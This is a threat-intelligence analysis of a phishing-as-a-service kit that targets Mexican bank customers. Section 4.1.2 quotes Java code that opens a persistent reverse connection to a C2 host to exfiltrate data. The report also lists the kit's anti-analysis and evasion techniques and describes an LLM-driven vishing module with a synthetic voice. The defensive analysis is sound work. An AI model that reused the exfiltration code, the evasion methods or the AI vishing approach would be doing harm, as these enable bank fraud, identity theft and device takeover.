Classification: Confidential — Internal Use Only
 Kit Name: Balonx Sistema
 Type: Phishing-as-a-Service (PhaaS) — Live Phishing / Reverse Proxy
 Primary Target: Banking users in Mexico
 

1. Targeted Financial Institutions

The kit has hardcoded configurations and logos to impersonate the following institutions:

Major Banks: BBVA, Citibanamex, Banorte, Santander, HSBC, Scotiabank, Banco Azteca, BanCoppel, BanBajío, Banregio, Inbursa, Invex, Afirme, Mifel, Banjército, Banco del Bienestar

Cards and Fintechs: Liverpool, Plata Card, Spin by Oxxo, Falabella, American Express

2. Business Model (Criminal SaaS)

3. Threat Actor Identities

The code repeatedly checks whether the logged-in user is "balonx" or "brandon" to grant global administration permissions.

3.1 Hardcoded SuperAdmin Behavior

  • balonx — Primary SuperAdmin. Full access to the panel, including exclusive sections hidden from other admins.
  • brandon — Special hardcoded behavior: the system forces retrieval of saved sessions (not active) regardless of the selected tab. Suggests an audit or historical data review role.

4.1.2 Reverse Shell Mechanism (sendBytes Function)

Once installed, the victim's device establishes a persistent TCP connection to the C2:

Socket socket3 = new Socket(InetAddress.getByName(C2_HOST), C2_PORT);

socket3.setSoTimeout(0); // No timeout — permanent connection

outputStream.write(data); // Real-time data exfiltration

 

  • setSoTimeout(0) ensures the connection never expires.
  • All captured data is sent in real-time to the C2.
  • The attacker maintains full and persistent control over the victim's Android device.

C2 Infrastructure Details

 

Note: cheapy[.]host is a low-cost hosting provider with low responsiveness to abuse reports (bulletproof-adjacent). The IP block is registered with AFRINIC (Africa), but the contact address is in Virginia Beach — a typical structure designed to complicate takedowns.

6. Kit Capabilities — Attack Vectors

6.1. Real-Time Attack (Live Phishing)

The core of the kit is full real-time control over the victim's screen via WebSocket (/ws). This allows bypassing any type of MFA.

Screens the attacker can force (SCREEN_CHANGE):

6.2. Identity Theft — KYC Bypass

The VERIFICACION_ID module activates the victim's device camera to capture:

  • Front and back of national ID (INE) or Passport
  • Victim selfie

This data is used to bypass bank KYC systems: opening fraudulent accounts or authorizing high-risk transactions.

6.3. Malware Distribution (Not Confirmed)

In the PROTECCION_BANCARIA state, the page displays a fake security alert ("It is necessary to protect your balance") and induces the victim to install BankProtect.apk.

The APK module allows the operator to:

  1. Upload a custom APK (/api/upload-apk)
  2. Assign it to specific users (/api/assign-apk)
  3. Serve it dynamically to victims via /api/get-user-apk/{id}

6.4. Multi-role (Fraudulent Call Center)

The "Office" plan includes an Executive hierarchy where up to 8 sub-operators can simultaneously operate multiple victim sessions, replicating the structure of a fraudulent call center.

7. Operational Hierarchy

SuperAdmin (balonx / brandon)

    └── Admin (affiliated operator — Individual or Office plan)

            └── Executive (Office plan sub-operator, max. 8)

                    └── Victim session (real-time)

  • Executives log in with an OTP sent via Telegram to the owning Admin.
  • Executives can view and operate victim sessions in real time but do not have access to the full admin panel.
  • The Admin controls which banks each Executive can use (allowedBanks).
  • Each Admin can have up to 8 simultaneous Executives, replicating a fraudulent call center structure.

9. WebSocket Channel — Real-Time Events (/ws)

 

9. Technical Architecture

9.1 Stack

  • Frontend: React + Vite (compiled bundle), Tailwind CSS, shadcn/ui, TanStack Query
  • Backend ORM: Drizzle ORM on PostgreSQL (full schema visible in bundle)
  • Real-time: Native WebSocket with automatic reconnection and PING every 25 seconds
  • Authentication: JWT stored in localStorage under the key authToken
  • Validation: Zod (full schemas of all entities exposed in the bundle)

9.2 Database Schema (Exposed via Drizzle ORM)

The bundle exposes the complete Drizzle ORM schema. Identified tables:

9.3 sessions Table — Full Field List (Stolen Victim Data)

Each victim session stores:

sessionId, folio, username, password, banco, tarjeta, fechaVencimiento, cvv,

sms, nip, smsCompra, celular, pasoActual, qrData, qrImageData,

10. Victim Geolocation System

The kit captures and stores:

  • GPS coordinates (latitude and longitude) of the victim's device
  • Direct Google Maps link with the exact location, automatically generated
  • IP address obtained via api[.]ipify[.]org
  • Timestamp of when the location was obtained

11. Link Generation and Management

  • Generated links support Bitly shortening (bitlyLinkId, shortUrl fields in link_tokens table)
  • Each link has an expiration time and can be extended in 30-minute blocks from the panel
  • The link_usage_weekly table implements a weekly link quota per user, presumably as a service control mechanism
  • The endpoint /api/generate-link?banco={BANK} generates a unique link per bank on each call

 

 

12. Evasion and Anti-Analysis Techniques

  • Geolocation Spoofing: Overwrites navigator.geolocation to always return CDMX coordinates (19.4326, -99.1332), deceiving geographic anti-fraud systems.
  • Headless Browser Evasion: Removes traces of Selenium, PhantomJS, and Nightmare from the browser environment.
  • Canvas/WebGL Poisoning: Adds random noise to toDataURL and getImageData to alter browser fingerprinting.
  • Human Behavior Detection (behaviorScore): Evaluates typing speed, mouse movement, and clicks. Threshold: 50 points. If the session does not appear human, access is blocked.
  • WebRTC Spoofing: Injects fake STUN/TURN servers to hide the real C2 server IP.
  • hCaptcha: Implemented as an anti-bot filter. The bundle uses the Vite test key (VITE_HCAPTCHA_SITE_KEY) instead of a production key — this may facilitate bypass in analysis environments.
  • Device limit: Each operator account has a maximum of 2 registered devices (maxDevices). When exceeded, the user is redirected to /balonx to confuse investigators.

17. AI Vishing Module

 

Analysis Date: 2026-05-26

 

Analyzed Files:

  • index-FreePBX-Balonx.html (241 KB) — FreePBX UCP login page.
  • index-CallBalonx.js (1.2 MB) — AI Call Center panel frontend.

Key Finding: Balonx Sistema has evolved from the classic PhaaS model (web phishing + APK) to a second independent and parallel service: an automated vishing Call Center with generative AI (synthetic voice + conversational LLM + Whisper for ASR). This module DOES NOT replace the previous infrastructure — it coexists with it and is offered as a separate product to kit affiliates.

 

VAIaaS Service Summary (Vishing-AI-as-a-Service)

 

 

 

 

New C2 Infrastructure (Independent of aclaracionesditales[.]com)

Key Implication: This is the first time the group has operated its own SIP private branch exchange (PBX) instead of abusing a legitimate provider (central[.]voipleaders[.]net). This suggests operational maturity and/or that VoIP Leaders has already detected and blocked them.

 

Identified Generative AI Stack

The bundle exposes multiple integrations with commercial AI providers — the "bank executive" calling the victim is no longer human; it is an LLM speaking with a synthetic voice.

 

Critical Attribution Vector: The /api/dashboard/ai-costs imply an active paid account with OpenAI and ElevenLabs. Both providers apply KYC to the payment method — this is the best vector for attributing the group to a real identity.
